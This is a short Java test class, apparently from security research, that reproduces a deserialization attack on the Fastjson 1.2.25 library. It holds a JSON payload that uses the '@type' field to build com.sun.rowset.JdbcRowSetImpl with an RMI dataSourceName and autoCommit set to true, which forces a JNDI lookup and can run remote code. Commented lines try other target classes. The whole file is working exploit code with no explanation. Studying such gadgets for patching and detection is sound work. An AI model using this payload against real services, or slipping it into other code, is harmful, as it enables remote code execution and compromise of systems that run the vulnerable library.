// 1.2.25
package org.example;

import com.alibaba.fastjson.JSON;

import javax.sql.rowset.BaseRowSet;
import javax.sql.rowset.JdbcRowSet;
import java.sql.SQLException;

public class TestJdbcRowSetImpl {
    public static void main(String[] args) throws SQLException {
//        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
//        rowSet.setDataSourceName("rmi://localhost:1999/obj");
//        rowSet.setAutoCommit(true);
        String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
//        JSON.parseObject(fastSer,Object.class);
//        JSON.parseObject(fastSer, JdbcRowSet.class);
//        JSON.parseObject(fastSer, BaseRowSet.class);
        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class);
    }
}
